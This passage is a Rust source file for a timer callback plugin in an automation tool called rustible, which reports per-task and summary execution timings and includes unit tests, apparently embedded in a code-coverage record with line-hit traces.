parallel execution\n//! - Can be combined with other stdout plugins\n//!\n//! # Example Usage\n//!\n//! ```rust,ignore\n//! use rustible::callback::plugins::timer::{TimerCallback, TimerConfig};\n//!\n//! let timer = TimerCallback::new(TimerConfig {\n//!     show_per_task: true,\n//!     show_summary: true,\n//!     top_slowest: 10,\n//!     threshold_secs: 0.0,\n//!     ..Default::default()\n//! });\n//!\n//! // Use with playbook executor\n//! executor.add_callback(Box::new(timer));\n//! ```\n//!\n//! # Example Output\n//!\n//! ```text\n//! TASK [Install nginx] *******************************************************\n//!   ok : [webserver1] Install nginx (2.345s)\n//!   changed : [webserver2] Install nginx (3.456s)\n//!\n//! TIMING SUMMARY *************************************************************\n//!\n//! Total tasks executed: 15\n//! Total execution time: 45.678s\n//! Average task time:    3.045s\n//!\n//! Slowest tasks (top 10):\n//!\n//!   Duration  Task                            Host                  Status\n//!   --------  --------------------------------  --------------------  --------\n//!    12.345s  Install packages                 webserver1            changed\n//!     8.234s  Configure nginx                  webserver2            changed\n//!     5.123s  Deploy application               webserver1            ok\n//! ```\n\nuse std::collections::HashMap;\nuse std::sync::atomic::{AtomicU64, Ordering};\nuse std::time::{Duration, Instant};\n\nuse async_trait::async_trait;\nuse colored::Colorize;\nuse parking_lot::RwLock;\n\nuse crate::facts::Facts;\nuse crate::traits::{ExecutionCallback, ExecutionResult};\n\n/// Configuration options for the timer callback plugin\n#[derive(Debug, Clone)]\npub struct TimerConfig {\n    /// Show timing after each task completes\n    pub show_per_task: bool,\n    /// Show summary of slowest tasks at end\n    pub show_summary: bool,\n    /// Number of slowest tasks to show in summary\n    pub top_slowest: usize,\n    /// Only show tasks that took longer than this threshold (seconds)\n    pub threshold_secs: f64,\n    /// Show play-level timing\n    pub show_play_timing: bool,\n    /// Show playbook-level timing\n    pub show_playbook_timing: bool,\n    /// Use colors in output\n    pub use_colors: bool,\n    /// Show timing in human-readable format\n    pub human_readable: bool,\n}\n\nimpl Default for TimerConfig {\n    fn default() -\u003e Self {\n        Self {\n            show_per_task: true,\n            show_summary: true,\n            top_slowest: 10,\n            threshold_secs: 0.0,\n            show_play_timing: true,\n            show_playbook_timing: true,\n            use_colors: true,\n            human_readable: true,\n        }\n    }\n}\n\n/// Entry for tracking a single task's timing\n#[derive(Debug, Clone)]\npub struct TimerTaskTiming {\n    /// Task name\n    pub task_name: String,\n    /// Host the task ran on\n    pub host: String,\n    /// Duration of the task execution\n    pub duration: Duration,\n    /// Whether the task succeeded\n    pub success: bool,\n    /// Whether the task made changes\n    pub changed: bool,\n}\n\n/// Entry for tracking play timing\n#[derive(Debug, Clone)]\nstruct PlayTiming {\n    name: String,\n    start: Instant,\n    end: Option\u003cInstant\u003e,\n    hosts: Vec\u003cString\u003e,\n}\n\n/// Internal state for tracking timing across execution\n#[derive(Debug, Default)]\nstruct TimerState {\n    /// All task timings collected during execution\n    task_timings: Vec\u003cTimerTaskTiming\u003e,\n    /// Current task start times (task_name:host -\u003e start_time)\n    task_starts: HashMap\u003cString, Instant\u003e,\n    /// Play timings\n    play_timings: Vec\u003cPlayTiming\u003e,\n    /// Current play index\n    current_play: Option\u003cusize\u003e,\n    /// Playbook start time\n    playbook_start: Option\u003cInstant\u003e,\n    /// Playbook name\n    playbook_name: Option\u003cString\u003e,\n}\n\n/// Timer callback plugin that tracks and reports execution timing\n///\n/// This plugin implements the `ExecutionCallback` trait to receive\n/// notifications about task execution and track timing information.\n///\n/// # Thread Safety\n///\n/// The timer uses `parking_lot::RwLock` for state management and\n/// `AtomicU64` for counters, making it safe for concurrent access\n/// during parallel task execution.\n///\n/// # Combining with Other Plugins\n///\n/// The timer callback is designed to work alongside other callback\n/// plugins. It only outputs timing-specific information and doesn't\n/// interfere with task result output from other plugins.\n#[derive(Debug)]\npub struct TimerCallback {\n    /// Configuration for the timer\n    config: TimerConfig,\n    /// Internal state protected by RwLock for thread-safe access\n    state: RwLock\u003cTimerState\u003e,\n    /// Total tasks executed (atomic for lock-free counting)\n    total_tasks: AtomicU64,\n    /// Total duration in microseconds (atomic for aggregation)\n    total_duration_us: AtomicU64,\n}\n\nimpl TimerCallback {\n    /// Create a new timer callback with the given configuration\n    pub fn new(config: TimerConfig) -\u003e Self {\n        Self {\n            config,\n            state: RwLock::new(TimerState::default()),\n            total_tasks: AtomicU64::new(0),\n            total_duration_us: AtomicU64::new(0),\n        }\n    }\n\n    /// Create a timer callback with default configuration\n    pub fn default_config() -\u003e Self {\n        Self::new(TimerConfig::default())\n    }\n\n    /// Create a minimal timer that only shows summary\n    pub fn summary_only() -\u003e Self {\n        Self::new(TimerConfig {\n            show_per_task: false,\n            show_summary: true,\n            top_slowest: 10,\n            ..Default::default()\n        })\n    }\n\n    /// Create a verbose timer that shows everything\n    pub fn verbose() -\u003e Self {\n        Self::new(TimerConfig {\n            show_per_task: true,\n            show_summary: true,\n            top_slowest: 20,\n            threshold_secs: 0.0,\n            show_play_timing: true,\n            show_playbook_timing: true,\n            use_colors: true,\n            human_readable: true,\n        })\n    }\n\n    /// Get all collected task timings\n    pub fn get_timings(\u0026self) -\u003e Vec\u003cTimerTaskTiming\u003e {\n        self.state.read().task_timings.clone()\n    }\n\n    /// Get the top N slowest tasks\n    pub fn get_slowest_tasks(\u0026self, n: usize) -\u003e Vec\u003cTimerTaskTiming\u003e {\n        let state = self.state.read();\n        let mut timings = state.task_timings.clone();\n        timings.sort_by(|a, b| b.duration.cmp(\u0026a.duration));\n        timings.into_iter().take(n).collect()\n    }\n\n    /// Get total execution time across all tasks\n    pub fn get_total_duration(\u0026self) -\u003e Duration {\n        Duration::from_micros(self.total_duration_us.load(Ordering::Relaxed))\n    }\n\n    /// Get total number of tasks executed\n    pub fn get_total_tasks(\u0026self) -\u003e u64 {\n        self.total_tasks.load(Ordering::Relaxed)\n    }\n\n    /// Get average task duration\n    pub fn get_average_duration(\u0026self) -\u003e Duration {\n        let total = self.get_total_duration();\n        let count = self.get_total_tasks();\n        if count == 0 {\n            Duration::ZERO\n        } else {\n            total / count as u32\n        }\n    }\n\n    /// Format a duration in human-readable format\n    fn format_duration(\u0026self, duration: Duration) -\u003e String {\n        if self.config.human_readable {\n            format_duration_human(duration)\n        } else {\n            format!(\"{:.3}s\", duration.as_secs_f64())\n        }\n    }\n\n    /// Print task timing (called after task completion)\n    fn print_task_timing(\u0026self, timing: \u0026TimerTaskTiming) {\n        if !self.config.show_per_task {\n            return;\n        }\n\n        // Skip tasks below threshold\n        if timing.duration.as_secs_f64() \u003c self.config.threshold_secs {\n            return;\n        }\n\n        let duration_str = self.format_duration(timing.duration);\n\n        let status = if !timing.success {\n            if self.config.use_colors {\n                \"FAILED\".red().bold().to_string()\n            } else {\n                \"FAILED\".to_string()\n            }\n        } else if timing.changed {\n            if self.config.use_colors {\n                \"changed\".yellow().to_string()\n            } else {\n                \"changed\".to_string()\n            }\n        } else if self.config.use_colors {\n            \"ok\".green().to_string()\n        } else {\n            \"ok\".to_string()\n        };\n\n        let time_display = if self.config.use_colors {\n            colorize_duration(timing.duration, \u0026duration_str)\n        } else {\n            duration_str\n        };\n\n        println!(\n            \"  {} : [{}] {} ({})\",\n            status, timing.host, timing.task_name, time_display\n        );\n    }\n\n    /// Print the timing summary at the end of execution\n    fn print_summary(\u0026self) {\n        if !self.config.show_summary {\n            return;\n        }\n\n        let state = self.state.read();\n\n        if state.task_timings.is_empty() {\n            return;\n        }\n\n        // Calculate statistics\n        let total_duration = self.get_total_duration();\n        let total_tasks = self.get_total_tasks();\n        let avg_duration = self.get_average_duration();\n\n        // Get slowest tasks\n        let mut timings = state.task_timings.clone();\n        timings.sort_by(|a, b| b.duration.cmp(\u0026a.duration));\n        let slowest: Vec\u003c_\u003e = timings.into_iter().take(self.config.top_slowest).collect();\n\n        // Print summary header\n        println!();\n        if self.config.use_colors {\n            println!(\n                \"{} {}\",\n                \"TIMING SUMMARY\".bright_white().bold(),\n                \"*\".repeat(65).bright_black()\n            );\n        } else {\n            println!(\"TIMING SUMMARY {}\", \"*\".repeat(65));\n        }\n        println!();\n\n        // Overall statistics\n        println!(\n            \"Total tasks executed: {}\",\n            if self.config.use_colors {\n                total_tasks.to_string().bright_white().bold().to_string()\n            } else {\n                total_tasks.to_string()\n            }\n        );\n        println!(\n            \"Total execution time: {}\",\n            if self.config.use_colors {\n                self.format_duration(total_duration)\n                    .bright_cyan()\n                    .to_string()\n            } else {\n                self.format_duration(total_duration)\n            }\n        );\n        println!(\n            \"Average task time:    {}\",\n            self.format_duration(avg_duration)\n        );\n        println!();\n\n        // Slowest tasks\n        if !slowest.is_empty() {\n            if self.config.use_colors {\n                println!(\n                    \"{} (top {}):\",\n                    \"Slowest tasks\".yellow().bold(),\n                    self.config.top_slowest\n                );\n            } else {\n                println!(\"Slowest tasks (top {}):\", self.config.top_slowest);\n            }\n            println!();\n\n            // Table header\n            println!(\n                \"  {:\u003e8}  {:30}  {:20}  {:8}\",\n                \"Duration\", \"Task\", \"Host\", \"Status\"\n            );\n            if self.config.use_colors {\n                println!(\"  {}\", \"-\".repeat(72).bright_black());\n            } else {\n                println!(\"  {}\", \"-\".repeat(72));\n            }\n\n            for timing in \u0026slowest {\n                let duration_str = self.format_duration(timing.duration);\n                let status = if !timing.success {\n                    if self.config.use_colors {\n                        \"failed\".red().to_string()\n                    } else {\n                        \"failed\".to_string()\n                    }\n                } else if timing.changed {\n                    if self.config.use_colors {\n                        \"changed\".yellow().to_string()\n                    } else {\n                        \"changed\".to_string()\n                    }\n                } else if self.config.use_colors {\n                    \"ok\".green().to_string()\n                } else {\n                    \"ok\".to_string()\n                };\n\n                let time_display = if self.config.use_colors {\n                    colorize_duration(timing.duration, \u0026duration_str)\n                } else {\n                    duration_str\n                };\n\n                // Truncate long names\n                let task_name = truncate_string(\u0026timing.task_name, 30);\n                let host = truncate_string(\u0026timing.host, 20);\n\n                println!(\n                    \"  {:\u003e8}  {:30}  {:20}  {:8}\",\n                    time_display, task_name, host, status\n                );\n            }\n            println!();\n        }\n\n        // Playbook timing\n        if self.config.show_playbook_timing {\n            if let Some(start) = state.playbook_start {\n                let playbook_duration = start.elapsed();\n                let name = state.playbook_name.as_deref().unwrap_or(\"playbook\");\n                if self.config.use_colors {\n                    println!(\n                        \"{} '{}' completed in {}\",\n                        \"Playbook\".bright_white().bold(),\n                        name.bright_cyan(),\n                        self.format_duration(playbook_duration).bright_green()\n                    );\n                } else {\n                    println!(\n                        \"Playbook '{}' completed in {}\",\n                        name,\n                        self.format_duration(playbook_duration)\n                    );\n                }\n            }\n        }\n\n        // Play timings\n        if self.config.show_play_timing \u0026\u0026 !state.play_timings.is_empty() {\n            println!();\n            if self.config.use_colors {\n                println!(\"{}:\", \"Play timings\".yellow().bold());\n            } else {\n                println!(\"Play timings:\");\n            }\n\n            for play in \u0026state.play_timings {\n                if let Some(end) = play.end {\n                    let duration = end.duration_since(play.start);\n                    let host_count = play.hosts.len();\n                    println!(\n                        \"  {} - {} ({} host{})\",\n                        play.name,\n                        self.format_duration(duration),\n                        host_count,\n                        if host_count == 1 { \"\" } else { \"s\" }\n                    );\n                }\n            }\n        }\n    }\n\n    /// Record a task start time\n    fn record_task_start(\u0026self, task_name: \u0026str, host: \u0026str) {\n        let key = format!(\"{}:{}\", task_name, host);\n        self.state.write().task_starts.insert(key, Instant::now());\n    }\n\n    /// Record a task completion and calculate duration\n    fn record_task_complete(\n        \u0026self,\n        task_name: \u0026str,\n        host: \u0026str,\n        success: bool,\n        changed: bool,\n        explicit_duration: Option\u003cDuration\u003e,\n    ) {\n        let key = format!(\"{}:{}\", task_name, host);\n\n        let duration = if let Some(d) = explicit_duration {\n            d\n        } else {\n            let mut state = self.state.write();\n            if let Some(start) = state.task_starts.remove(\u0026key) {\n                start.elapsed()\n            } else {\n                // If we don't have a start time, use zero duration\n                Duration::ZERO\n            }\n        };\n\n        let timing = TimerTaskTiming {\n            task_name: task_name.to_string(),\n            host: host.to_string(),\n            duration,\n            success,\n            changed,\n        };\n\n        // Update atomic counters\n        self.total_tasks.fetch_add(1, Ordering::Relaxed);\n        self.total_duration_us\n            .fetch_add(duration.as_micros() as u64, Ordering::Relaxed);\n\n        // Print timing if configured\n        self.print_task_timing(\u0026timing);\n\n        // Store timing for summary\n        self.state.write().task_timings.push(timing);\n    }\n\n    /// Reset all timing data (useful for reuse)\n    pub fn reset(\u0026self) {\n        let mut state = self.state.write();\n        state.task_timings.clear();\n        state.task_starts.clear();\n        state.play_timings.clear();\n        state.current_play = None;\n        state.playbook_start = None;\n        state.playbook_name = None;\n        self.total_tasks.store(0, Ordering::Relaxed);\n        self.total_duration_us.store(0, Ordering::Relaxed);\n    }\n}\n\n#[async_trait]\nimpl ExecutionCallback for TimerCallback {\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        let mut state = self.state.write();\n        state.playbook_start = Some(Instant::now());\n        state.playbook_name = Some(name.to_string());\n    }\n\n    async fn on_playbook_end(\u0026self, _name: \u0026str, _success: bool) {\n        // Print the summary at the end of the playbook\n        self.print_summary();\n    }\n\n    async fn on_play_start(\u0026self, name: \u0026str, hosts: \u0026[String]) {\n        let mut state = self.state.write();\n        let play_timing = PlayTiming {\n            name: name.to_string(),\n            start: Instant::now(),\n            end: None,\n            hosts: hosts.to_vec(),\n        };\n        state.play_timings.push(play_timing);\n        state.current_play = Some(state.play_timings.len() - 1);\n    }\n\n    async fn on_play_end(\u0026self, _name: \u0026str, _success: bool) {\n        let mut state = self.state.write();\n        if let Some(idx) = state.current_play {\n            if let Some(play) = state.play_timings.get_mut(idx) {\n                play.end = Some(Instant::now());\n            }\n        }\n        state.current_play = None;\n    }\n\n    async fn on_task_start(\u0026self, name: \u0026str, host: \u0026str) {\n        self.record_task_start(name, host);\n    }\n\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        let success = result.result.success;\n        let changed = result.result.changed;\n\n        // Use the duration from ExecutionResult if available, otherwise calculate\n        let duration = if result.duration \u003e Duration::ZERO {\n            Some(result.duration)\n        } else {\n            None\n        };\n\n        self.record_task_complete(\u0026result.task_name, \u0026result.host, success, changed, duration);\n    }\n\n    async fn on_handler_triggered(\u0026self, _name: \u0026str) {\n        // Handlers are tracked as tasks, so we just note when they're triggered\n    }\n\n    async fn on_facts_gathered(\u0026self, _host: \u0026str, _facts: \u0026Facts) {\n        // Could track fact gathering time if needed\n    }\n}\n\nimpl Clone for TimerCallback {\n    fn clone(\u0026self) -\u003e Self {\n        Self {\n            config: self.config.clone(),\n            state: RwLock::new(TimerState::default()),\n            total_tasks: AtomicU64::new(0),\n            total_duration_us: AtomicU64::new(0),\n        }\n    }\n}\n\nimpl Default for TimerCallback {\n    fn default() -\u003e Self {\n        Self::default_config()\n    }\n}\n\n// ============================================================================\n// Builder Pattern for Configuration\n// ============================================================================\n\n/// Builder for creating TimerCallback with custom configuration\n#[derive(Debug, Default)]\npub struct TimerCallbackBuilder {\n    config: TimerConfig,\n}\n\nimpl TimerCallbackBuilder {\n    /// Create a new builder with default configuration\n    pub fn new() -\u003e Self {\n        Self::default()\n    }\n\n    /// Set whether to show timing after each task\n    pub fn show_per_task(mut self, enabled: bool) -\u003e Self {\n        self.config.show_per_task = enabled;\n        self\n    }\n\n    /// Set whether to show summary at end\n    pub fn show_summary(mut self, enabled: bool) -\u003e Self {\n        self.config.show_summary = enabled;\n        self\n    }\n\n    /// Set number of slowest tasks to show\n    pub fn top_slowest(mut self, count: usize) -\u003e Self {\n        self.config.top_slowest = count;\n        self\n    }\n\n    /// Set minimum threshold for showing task timing (seconds)\n    pub fn threshold_secs(mut self, seconds: f64) -\u003e Self {\n        self.config.threshold_secs = seconds;\n        self\n    }\n\n    /// Set whether to show play timing\n    pub fn show_play_timing(mut self, enabled: bool) -\u003e Self {\n        self.config.show_play_timing = enabled;\n        self\n    }\n\n    /// Set whether to show playbook timing\n    pub fn show_playbook_timing(mut self, enabled: bool) -\u003e Self {\n        self.config.show_playbook_timing = enabled;\n        self\n    }\n\n    /// Set whether to use colors\n    pub fn use_colors(mut self, enabled: bool) -\u003e Self {\n        self.config.use_colors = enabled;\n        self\n    }\n\n    /// Set whether to use human-readable format\n    pub fn human_readable(mut self, enabled: bool) -\u003e Self {\n        self.config.human_readable = enabled;\n        self\n    }\n\n    /// Build the TimerCallback\n    pub fn build(self) -\u003e TimerCallback {\n        TimerCallback::new(self.config)\n    }\n}\n\n// ============================================================================\n// Helper Functions\n// ============================================================================\n\n/// Format a duration in human-readable format\nfn format_duration_human(duration: Duration) -\u003e String {\n    let secs = duration.as_secs();\n    let millis = duration.subsec_millis();\n    let micros = duration.subsec_micros() % 1000;\n\n    if secs \u003e= 3600 {\n        let hours = secs / 3600;\n        let mins = (secs % 3600) / 60;\n        let remaining_secs = secs % 60;\n        format!(\"{}h {:02}m {:02}s\", hours, mins, remaining_secs)\n    } else if secs \u003e= 60 {\n        let mins = secs / 60;\n        let remaining_secs = secs % 60;\n        format!(\"{}m {:02}s\", mins, remaining_secs)\n    } else if secs \u003e 0 {\n        format!(\"{}.{:03}s\", secs, millis)\n    } else if millis \u003e 0 {\n        format!(\"{}.{:03}ms\", millis, micros)\n    } else {\n        format!(\"{}us\", duration.as_micros())\n    }\n}\n\n/// Colorize duration based on how long it took\nfn colorize_duration(duration: Duration, text: \u0026str) -\u003e String {\n    let secs = duration.as_secs_f64();\n\n    if secs \u003e= 30.0 {\n        text.red().bold().to_string()\n    } else if secs \u003e= 10.0 {\n        text.red().to_string()\n    } else if secs \u003e= 5.0 {\n        text.yellow().to_string()\n    } else if secs \u003e= 1.0 {\n        text.bright_yellow().to_string()\n    } else {\n        text.green().to_string()\n    }\n}\n\n/// Truncate a string to fit within a maximum width\nfn truncate_string(s: \u0026str, max_width: usize) -\u003e String {\n    if s.len() \u003c= max_width {\n        s.to_string()\n    } else if max_width \u003c= 3 {\n        \".\".repeat(max_width)\n    } else {\n        format!(\"{}...\", \u0026s[..max_width - 3])\n    }\n}\n\n// ============================================================================\n// Tests\n// ============================================================================\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use crate::traits::ModuleResult;\n\n    #[test]\n    fn test_timer_callback_creation() {\n        let timer = TimerCallback::default();\n        assert!(timer.config.show_per_task);\n        assert!(timer.config.show_summary);\n        assert_eq!(timer.config.top_slowest, 10);\n    }\n\n    #[test]\n    fn test_timer_callback_builder() {\n        let timer = TimerCallbackBuilder::new()\n            .show_per_task(false)\n            .show_summary(true)\n            .top_slowest(5)\n            .threshold_secs(1.0)\n            .use_colors(false)\n            .build();\n\n        assert!(!timer.config.show_per_task);\n        assert!(timer.config.show_summary);\n        assert_eq!(timer.config.top_slowest, 5);\n        assert_eq!(timer.config.threshold_secs, 1.0);\n        assert!(!timer.config.use_colors);\n    }\n\n    #[test]\n    fn test_format_duration_human() {\n        assert_eq!(format_duration_human(Duration::from_micros(500)), \"500us\");\n        assert_eq!(format_duration_human(Duration::from_millis(50)), \"50.000ms\");\n        assert_eq!(format_duration_human(Duration::from_millis(1500)), \"1.500s\");\n        assert_eq!(format_duration_human(Duration::from_secs(90)), \"1m 30s\");\n        assert_eq!(\n            format_duration_human(Duration::from_secs(3700)),\n            \"1h 01m 40s\"\n        );\n    }\n\n    #[test]\n    fn test_truncate_string() {\n        assert_eq!(truncate_string(\"short\", 10), \"short\");\n        assert_eq!(truncate_string(\"this is a long string\", 10), \"this is...\");\n        assert_eq!(truncate_string(\"ab\", 2), \"ab\");\n        assert_eq!(truncate_string(\"abcd\", 3), \"...\");\n    }\n\n    #[test]\n    fn test_timer_timing_collection() {\n        let timer = TimerCallback::default();\n\n        // Simulate task execution\n        timer.record_task_start(\"task1\", \"host1\");\n        std::thread::sleep(Duration::from_millis(10));\n        timer.record_task_complete(\"task1\", \"host1\", true, false, None);\n\n        timer.record_task_start(\"task2\", \"host1\");\n        std::thread::sleep(Duration::from_millis(20));\n        timer.record_task_complete(\"task2\", \"host1\", true, true, None);\n\n        let timings = timer.get_timings();\n        assert_eq!(timings.len(), 2);\n        assert_eq!(timer.get_total_tasks(), 2);\n    }\n\n    #[test]\n    fn test_timer_slowest_tasks() {\n        let timer = TimerCallback::default();\n\n        // Add timings with explicit durations\n        timer.record_task_complete(\n            \"fast\",\n            \"host1\",\n            true,\n            false,\n            Some(Duration::from_millis(10)),\n        );\n        timer.record_task_complete(\n            \"slow\",\n            \"host1\",\n            true,\n            false,\n            Some(Duration::from_millis(100)),\n        );\n        timer.record_task_complete(\n            \"medium\",\n            \"host1\",\n            true,\n            false,\n            Some(Duration::from_millis(50)),\n        );\n\n        let slowest = timer.get_slowest_tasks(2);\n        assert_eq!(slowest.len(), 2);\n        assert_eq!(slowest[0].task_name, \"slow\");\n        assert_eq!(slowest[1].task_name, \"medium\");\n    }\n\n    #[tokio::test]\n    async fn test_timer_async_callbacks() {\n        let timer = TimerCallback::default();\n\n        timer.on_playbook_start(\"test-playbook\").await;\n        timer\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string(), \"host2\".to_string()])\n            .await;\n        timer.on_task_start(\"task1\", \"host1\").await;\n\n        // Create a mock execution result\n        let result = ExecutionResult {\n            host: \"host1\".to_string(),\n            task_name: \"task1\".to_string(),\n            result: ModuleResult::ok(\"done\"),\n            duration: Duration::from_millis(50),\n            notify: vec![],\n        };\n\n        timer.on_task_complete(\u0026result).await;\n        timer.on_play_end(\"test-play\", true).await;\n        timer.on_playbook_end(\"test-playbook\", true).await;\n\n        let timings = timer.get_timings();\n        assert_eq!(timings.len(), 1);\n        assert_eq!(timings[0].task_name, \"task1\");\n        assert_eq!(timings[0].duration, Duration::from_millis(50));\n    }\n\n    #[test]\n    fn test_timer_clone() {\n        let timer = TimerCallback::default();\n        timer.record_task_complete(\"task1\", \"host1\", true, false, Some(Duration::from_secs(1)));\n\n        // Clone should start fresh\n        let cloned = timer.clone();\n        assert_eq!(cloned.get_total_tasks(), 0);\n        assert_eq!(cloned.get_timings().len(), 0);\n    }\n\n    #[test]\n    fn test_timer_average_duration() {\n        let timer = TimerCallback::default();\n\n        timer.record_task_complete(\"t1\", \"h1\", true, false, Some(Duration::from_secs(1)));\n        timer.record_task_complete(\"t2\", \"h1\", true, false, Some(Duration::from_secs(3)));\n\n        let avg = timer.get_average_duration();\n        assert_eq!(avg, Duration::from_secs(2));\n    }\n\n    #[test]\n    fn test_timer_summary_only() {\n        let timer = TimerCallback::summary_only();\n        assert!(!timer.config.show_per_task);\n        assert!(timer.config.show_summary);\n    }\n\n    #[test]\n    fn test_timer_verbose() {\n        let timer = TimerCallback::verbose();\n        assert!(timer.config.show_per_task);\n        assert!(timer.config.show_summary);\n        assert_eq!(timer.config.top_slowest, 20);\n    }\n\n    #[test]\n    fn test_timer_reset() {\n        let timer = TimerCallback::default();\n        timer.record_task_complete(\"task1\", \"host1\", true, false, Some(Duration::from_secs(1)));\n\n        assert_eq!(timer.get_total_tasks(), 1);\n\n        timer.reset();\n\n        assert_eq!(timer.get_total_tasks(), 0);\n        assert_eq!(timer.get_timings().len(), 0);\n    }\n}\n","traces":[{"line":87,"address":[29879760],"length":1,"stats":{"Line":1}},{"line":172,"address":[29876109,29875824],"length":1,"stats":{"Line":1}},{"line":175,"address":[29875859],"length":1,"stats":{"Line":1}},{"line":176,"address":[29875883,29875937],"length":1,"stats":{"Line":2}},{"line":177,"address":[29875965],"length":1,"stats":{"Line":1}},{"line":182,"address":[29871504],"length":1,"stats":{"Line":1}},{"line":183,"address":[29871517],"length":1,"stats":{"Line":1}},{"line":187,"address":[29862848],"length":1,"stats":{"Line":1}},{"line":188,"address":[29862877],"length":1,"stats":{"Line":1}},{"line":192,"address":[29862862],"length":1,"stats":{"Line":1}},{"line":197,"address":[29876624],"length":1,"stats":{"Line":1}},{"line":198,"address":[29876636],"length":1,"stats":{"Line":1}},{"line":211,"address":[29862829,29862688,29862823],"length":1,"stats":{"Line":1}},{"line":212,"address":[29862720,29862792],"length":1,"stats":{"Line":2}},{"line":216,"address":[29871824,29872203,29872209],"length":1,"stats":{"Line":1}},{"line":217,"address":[29871875],"length":1,"stats":{"Line":1}},{"line":218,"address":[29871905,29871959],"length":1,"stats":{"Line":2}},{"line":219,"address":[29871988,29872051],"length":1,"stats":{"Line":4}},{"line":220,"address":[29872058],"length":1,"stats":{"Line":1}},{"line":224,"address":[29874208],"length":1,"stats":{"Line":1}},{"line":225,"address":[29874213],"length":1,"stats":{"Line":1}},{"line":229,"address":[29871792],"length":1,"stats":{"Line":1}},{"line":230,"address":[29871797],"length":1,"stats":{"Line":1}},{"line":234,"address":[29874240],"length":1,"stats":{"Line":1}},{"line":235,"address":[29874254],"length":1,"stats":{"Line":1}},{"line":236,"address":[29874282],"length":1,"stats":{"Line":1}},{"line":237,"address":[29874320,29874297],"length":1,"stats":{"Line":1}},{"line":238,"address":[29874303],"length":1,"stats":{"Line":0}},{"line":240,"address":[29874336],"length":1,"stats":{"Line":1}},{"line":245,"address":[29871552],"length":1,"stats":{"Line":1}},{"line":246,"address":[29871586],"length":1,"stats":{"Line":1}},{"line":247,"address":[29871762],"length":1,"stats":{"Line":1}},{"line":249,"address":[29871599],"length":1,"stats":{"Line":0}},{"line":254,"address":[29872224,29873531,29872620],"length":1,"stats":{"Line":1}},{"line":255,"address":[29872257],"length":1,"stats":{"Line":1}},{"line":260,"address":[29872287],"length":1,"stats":{"Line":1}},{"line":264,"address":[29872328],"length":1,"stats":{"Line":1}},{"line":266,"address":[29872358],"length":1,"stats":{"Line":1}},{"line":267,"address":[29872369],"length":1,"stats":{"Line":0}},{"line":268,"address":[29872525,29872428],"length":1,"stats":{"Line":0}},{"line":270,"address":[29872400,29872500],"length":1,"stats":{"Line":0}},{"line":272,"address":[29872385],"length":1,"stats":{"Line":1}},{"line":273,"address":[29872647],"length":1,"stats":{"Line":1}},{"line":274,"address":[29872892,29872843],"length":1,"stats":{"Line":2}},{"line":276,"address":[29872815,29872874],"length":1,"stats":{"Line":0}},{"line":278,"address":[29872631],"length":1,"stats":{"Line":1}},{"line":279,"address":[29872742,29872693],"length":1,"stats":{"Line":2}},{"line":281,"address":[29872665,29872724],"length":1,"stats":{"Line":0}},{"line":284,"address":[29873012,29872507],"length":1,"stats":{"Line":1}},{"line":285,"address":[29873209,29873019],"length":1,"stats":{"Line":2}},{"line":287,"address":[29872965],"length":1,"stats":{"Line":0}},{"line":290,"address":[29873062,29873262],"length":1,"stats":{"Line":2}},{"line":297,"address":[29864035,29871488,29862976],"length":1,"stats":{"Line":1}},{"line":298,"address":[29863014],"length":1,"stats":{"Line":1}},{"line":302,"address":[29863055],"length":1,"stats":{"Line":1}},{"line":304,"address":[29863146,29863083],"length":1,"stats":{"Line":2}},{"line":309,"address":[29863248,29863185],"length":1,"stats":{"Line":2}},{"line":310,"address":[29863283],"length":1,"stats":{"Line":1}},{"line":311,"address":[29863322],"length":1,"stats":{"Line":1}},{"line":314,"address":[29863402],"length":1,"stats":{"Line":1}},{"line":315,"address":[29863540,29863460],"length":1,"stats":{"Line":2}},{"line":316,"address":[29863547],"length":1,"stats":{"Line":1}},{"line":319,"address":[29863671,29863737],"length":1,"stats":{"Line":2}},{"line":320,"address":[29863764],"length":1,"stats":{"Line":1}},{"line":321,"address":[29864068,29864152,29864232],"length":1,"stats":{"Line":3}},{"line":327,"address":[29863773,29863847],"length":1,"stats":{"Line":0}},{"line":329,"address":[29864518,29864006],"length":1,"stats":{"Line":2}},{"line":332,"address":[29864554,29864608],"length":1,"stats":{"Line":0}},{"line":340,"address":[29865249],"length":1,"stats":{"Line":1}},{"line":350,"address":[29865551],"length":1,"stats":{"Line":1}},{"line":354,"address":[29865710],"length":1,"stats":{"Line":1}},{"line":357,"address":[29865763],"length":1,"stats":{"Line":1}},{"line":358,"address":[29865798],"length":1,"stats":{"Line":1}},{"line":359,"address":[29866043],"length":1,"stats":{"Line":1}},{"line":365,"address":[29865908,29865843],"length":1,"stats":{"Line":0}},{"line":367,"address":[29865979,29866278],"length":1,"stats":{"Line":2}},{"line":370,"address":[29866297],"length":1,"stats":{"Line":1}},{"line":374,"address":[29866614],"length":1,"stats":{"Line":1}},{"line":375,"address":[29866655,29866899],"length":1,"stats":{"Line":2}},{"line":377,"address":[29866698,29866623],"length":1,"stats":{"Line":0}},{"line":380,"address":[29867206,29868919,29866865],"length":1,"stats":{"Line":3}},{"line":381,"address":[29867324,29867404],"length":1,"stats":{"Line":2}},{"line":382,"address":[29867412],"length":1,"stats":{"Line":1}},{"line":383,"address":[29867426],"length":1,"stats":{"Line":0}},{"line":384,"address":[29867607,29867491],"length":1,"stats":{"Line":0}},{"line":386,"address":[29867563,29867460],"length":1,"stats":{"Line":0}},{"line":388,"address":[29867445],"length":1,"stats":{"Line":1}},{"line":389,"address":[29867701],"length":1,"stats":{"Line":0}},{"line":390,"address":[29867958,29867906],"length":1,"stats":{"Line":0}},{"line":392,"address":[29867937,29867875],"length":1,"stats":{"Line":0}},{"line":394,"address":[29867682],"length":1,"stats":{"Line":1}},{"line":395,"address":[29867802,29867750],"length":1,"stats":{"Line":2}},{"line":397,"address":[29867719,29867781],"length":1,"stats":{"Line":0}},{"line":400,"address":[29867573,29868087],"length":1,"stats":{"Line":1}},{"line":401,"address":[29868267,29868097],"length":1,"stats":{"Line":2}},{"line":403,"address":[29868031],"length":1,"stats":{"Line":0}},{"line":407,"address":[29868346,29868158],"length":1,"stats":{"Line":2}},{"line":408,"address":[29868461,29868361],"length":1,"stats":{"Line":2}},{"line":410,"address":[29868603,29868476],"length":1,"stats":{"Line":2}},{"line":415,"address":[29867346],"length":1,"stats":{"Line":1}},{"line":419,"address":[29865817],"length":1,"stats":{"Line":1}},{"line":420,"address":[29868999],"length":1,"stats":{"Line":1}},{"line":421,"a